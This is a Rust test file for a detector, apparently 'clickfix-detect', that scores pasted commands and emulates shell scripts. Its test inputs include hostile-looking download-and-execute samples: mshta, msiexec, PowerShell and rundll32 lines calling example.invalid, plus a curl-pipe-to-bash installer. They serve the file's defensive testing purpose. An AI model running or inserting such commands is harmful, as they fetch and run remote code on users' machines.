use std::io::Write;
use std::process::{Command, Output, Stdio};

fn detector_command() -> Command {
    Command::new(env!("CARGO_BIN_EXE_clickfix-detect"))
}

fn run_interactive(input: &str, arguments: &[&str]) -> Output {
    let mut child = detector_command()
        .arg("--interactive")
        .args(arguments)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(input.as_bytes())
        .unwrap();
    child.wait_with_output().unwrap()
}

#[test]
fn interactive_mode_analyzes_multiple_payloads() {
    let output = run_interactive(
        "mshta https://example.invalid/fix\n\
         msiexec.exe /i https://example.invalid/package.msi /quiet\n\
         exit\n",
        &["--kind", "command"],
    );
    let stdout = String::from_utf8(output.stdout).unwrap();

    assert!(output.status.success());
    assert_eq!(stdout.matches("Verdict:").count(), 2);
    assert!(stdout.contains("launcher.lolbin"));
    assert!(stdout.contains("installer.remote-msi"));
    assert!(output.stderr.is_empty());
}

#[test]
fn interactive_mode_accepts_multiline_payloads() {
    let output = run_interactive(
        "powershell.exe -c \"\n\
         Invoke-WebRequest https://example.invalid/stage\n\
         \"\n\
         quit\n",
        &["--kind", "command"],
    );
    let stdout = String::from_utf8(output.stdout).unwrap();

    assert!(output.status.success());
    assert_eq!(stdout.matches("Verdict:").count(), 1);
    assert!(stdout.contains("behavior.network-intent"));
}

#[test]
fn interactive_json_is_one_object_per_line() {
    let output = run_interactive(
        "mshta https://example.invalid/one\n\
         rundll32.exe \\\\example.invalid\\share\\stage.dll,Start\n\
         :exit\n",
        &["--kind", "command", "--format", "json"],
    );
    let stdout = String::from_utf8(output.stdout).unwrap();
    let reports = stdout
        .lines()
        .map(|line| serde_json::from_str::<serde_json::Value>(line).unwrap())
        .collect::<Vec<_>>();

    assert!(output.status.success());
    assert_eq!(reports.len(), 2);
    assert!(reports.iter().all(|report| report.get("verdict").is_some()));
}

#[test]
fn interactive_help_does_not_consume_a_payload() {
    let output = run_interactive(
        ":help\nmshta https://example.invalid/fix\nexit\n",
        &["--kind", "command"],
    );
    let stdout = String::from_utf8(output.stdout).unwrap();

    assert!(output.status.success());
    assert!(stdout.contains("Enter one payload per submission."));
    assert_eq!(stdout.matches("Verdict:").count(), 1);
}

#[test]
fn allow_network_still_blocks_private_destinations() {
    let output = detector_command()
        .args([
            "--allow-network",
            "--kind",
            "command",
            "--format",
            "json",
            "mshta.exe http://127.0.0.1/private",
        ])
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    assert!(output.status.success());
    assert!(report["trace"].as_array().unwrap().iter().any(|event| {
        event["kind"] == "unsupported"
            && event["message"]
                .as_str()
                .is_some_and(|message| message.contains("destination is not public"))
    }));
    assert_eq!(
        report["network_urls"],
        serde_json::json!(["http://127.0.0.1/private"])
    );
    assert_eq!(report["network_activity"][0]["outcome"], "failed");
}

#[test]
fn safe_source_cli_controls_download_execute_scoring() {
    let payload = r#"curl -fsSL https://gh.io/copilot-install | VERSION="v0.0.369" PREFIX="$HOME/custom" bash"#;
    let trusted = detector_command()
        .args(["--kind", "command", "--format", "json", payload])
        .output()
        .unwrap();
    let trusted_report: serde_json::Value = serde_json::from_slice(&trusted.stdout).unwrap();
    assert_eq!(trusted_report["verdict"], "benign");
    assert_eq!(
        trusted_report["safe_network_urls"],
        serde_json::json!(["https://gh.io/copilot-install"])
    );

    let untrusted = detector_command()
        .args([
            "--no-default-safe-sources",
            "--kind",
            "command",
            "--format",
            "json",
            payload,
        ])
        .output()
        .unwrap();
    let untrusted_report: serde_json::Value = serde_json::from_slice(&untrusted.stdout).unwrap();
    assert_eq!(untrusted_report["verdict"], "malicious");
}

#[test]
fn thorough_mode_bypasses_the_hot_path_skip() {
    let hot_path = detector_command()
        .args(["--format", "json", "Meeting notes for Friday"])
        .output()
        .unwrap();
    let hot_path_report: serde_json::Value = serde_json::from_slice(&hot_path.stdout).unwrap();
    assert_eq!(hot_path_report["analysis_status"], "prefilter_only");
    assert!(hot_path_report["input"].get("sha256").is_none());

    let thorough = detector_command()
        .args([
            "--analysis-mode",
            "thorough",
            "--format",
            "json",
            "Meeting notes for Friday",
        ])
        .output()
        .unwrap();
    let thorough_report: serde_json::Value = serde_json::from_slice(&thorough.stdout).unwrap();
    assert_eq!(thorough_report["analysis_status"], "emulated");
    assert!(thorough_report["input"]["sha256"].is_string());
}

#[test]
fn bash_kind_runs_on_the_macos_emulation_path() {
    let output = detector_command()
        .args([
            "--kind",
            "bash",
            "--format",
            "json",
            "echo safe > /tmp/result.txt; cat /tmp/result.txt",
        ])
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    assert!(output.status.success());
    assert_eq!(report["input"]["kind"], "bash_script");
    assert!(report["virtual_files"]
        .as_array()
        .unwrap()
        .iter()
        .any(|file| { file["path"] == "/tmp/result.txt" && file["text"] == "safe\n" }));
}

#[test]
fn linux_bash_kind_runs_on_the_linux_emulation_path() {
    let output = detector_command()
        .args([
            "--kind",
            "linux-bash",
            "--format",
            "json",
            "echo safe > /tmp/result.txt; uname -a",
        ])
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();

    assert!(output.status.success());
    assert_eq!(report["host_platform"], "linux");
    assert_eq!(report["input"]["kind"], "linux_shell_script");
    assert!(report["virtual_files"]
        .as_array()
        .unwrap()
        .iter()
        .any(|file| { file["path"] == "/tmp/result.txt" && file["text"] == "safe\n" }));
}
